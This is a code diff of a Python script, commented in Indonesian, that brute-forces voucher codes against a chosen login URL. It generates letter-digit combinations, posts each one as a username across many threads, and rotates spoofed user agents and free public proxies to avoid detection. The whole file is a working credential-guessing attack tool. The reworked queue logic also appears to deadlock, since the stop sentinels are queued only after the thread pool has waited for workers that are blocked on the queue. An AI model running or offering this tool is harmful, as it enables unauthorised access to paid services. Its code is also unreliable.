@@ -9,9 +9,7 @@ import itertools
 from queue import Queue
 from concurrent.futures import ThreadPoolExecutor
 
-# Import User-Agent custom
 from user_agents import generate_user_agent
-
 from banner import print_banner
 
 # Konfigurasi dasar
@@ -27,9 +25,6 @@ voucher_queue = Queue()
 stop_event = threading.Event()
 
 def safe_input(prompt):
-    """
-    Input dengan handling Ctrl+C
-    """
     try:
         return input(prompt)
     except KeyboardInterrupt:
@@ -37,9 +32,6 @@ def safe_input(prompt):
         sys.exit(0)
 
 def get_target_url():
-    """
-    Ambil TARGET_URL dari config.txt, atau tanya user kalau belum ada.
-    """
     config_file = "config.txt"
     if os.path.exists(config_file):
         with open(config_file, "r") as f:
@@ -62,9 +54,6 @@ def get_target_url():
     return url
 
 def get_proxies():
-    """
-    Ambil proxy HTTP dari proxy-list.download
-    """
     print("[~] Mengambil proxy ...")
     url = "https://www.proxy-list.download/api/v1/get?type=http"
     response = requests.get(url)
@@ -81,12 +70,6 @@ def get_proxies():
     return proxies
 
 def generate_voucher_mirror(prefix, letters_len=2, digits_len=2):
-    """
-    Kombinasi:
-    - 2 huruf a-z
-    - Mirror: ab → ab & ba
-    - Angka 01–99
-    """
     letters = string.ascii_lowercase
     for letter_pair in itertools.product(letters, repeat=letters_len):
         letter_str = ''.join(letter_pair)
@@ -102,52 +85,38 @@ def generate_voucher_mirror(prefix, letters_len=2, digits_len=2):
                 yield f"{prefix}{pair}{num_str}"
 
 def load_tried_vouchers():
-    """
-    Muat cache success & failed
-    """
     for fname in ["success.log", "failed.log"]:
         if os.path.exists(fname):
             with open(fname, "r") as f:
                 for line in f:
                     tried_vouchers.add(line.strip())
 
-def load_mirror(prefix, letters_len=2, digits_len=2, on_complete=None):
-    """
-    Generate & masukkan ke Queue
-    Berhenti kalau stop_event aktif, panggil callback kalau selesai
-    """
+def load_mirror(prefix, letters_len=2, digits_len=2):
     print("[~] Generating kombinasi mirror ...")
     count = 0
     for v in generate_voucher_mirror(prefix, letters_len, digits_len):
         if stop_event.is_set():
-            break  # Stop kalau sudah success
+            break
         if v not in tried_vouchers:
             voucher_queue.put(v)
             count += 1
     print(f"[~] Total voucher kombinasi baru: {count}")
-
-    if on_complete:
-        on_complete()
+    print("[!] Semua voucher selesai digenerate.")
 
 def worker_mirror(use_proxy, proxy=None):
-    """
-    Worker brute mirror
-    """
     global working_proxies
     session = requests.Session()
 
     while not stop_event.is_set():
-        try:
-            voucher = voucher_queue.get_nowait()
-        except:
-            break  # Queue habis, worker stop
+        voucher = voucher_queue.get()  # Blocking GET
+        if voucher is None:
+            break
 
         with lock:
             tried_vouchers.add(voucher)
 
-        # ✅ Tambahkan pengecekan lagi:
         if stop_event.is_set():
-            break  # Ada thread lain yang SUCCESS
+            break
 
         payload = {
             "username": voucher,
@@ -206,17 +175,6 @@ def main():
 
     load_tried_vouchers()
 
-    def on_generate_done():
-        print("[!] Semua voucher selesai digenerate.")
-       
-
-    # Jalankan generator di thread
-    generator_thread = threading.Thread(
-        target=load_mirror,
-        args=(prefix, letters_len, digits_len, on_generate_done)
-    )
-    generator_thread.start()
-
     global working_proxies
     if use_proxy:
         working_proxies = get_proxies()
@@ -228,13 +186,22 @@ def main():
 
     print(f"[~] Mulai brute mirror {prefix}aa01 sampai {prefix}zz99 ... Tekan Ctrl+C untuk berhenti.\n")
 
+    generator_thread = threading.Thread(
+        target=load_mirror,
+        args=(prefix, letters_len, digits_len)
+    )
+    generator_thread.start()
+
     try:
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
             for i in range(MAX_THREADS):
                 proxy = working_proxies[i % len(working_proxies)] if use_proxy else None
                 executor.submit(worker_mirror, use_proxy, proxy)
 
-        generator_thread.join()  # Tunggu generator selesai
+        generator_thread.join()
+
+        for _ in range(MAX_THREADS):
+            voucher_queue.put(None)
 
     except KeyboardInterrupt:
         print("\n[!] Dihentikan manual.")
@@ -243,4 +210,5 @@ def main():
 
 if __name__ == "__main__":
     main()
-# This script is designed to brute force voucher codes using a mirror approach.
+# This code is a brute force script for testing voucher codes against a specified target URL.
+# It includes features for proxy support, multithreading, and voucher generation.
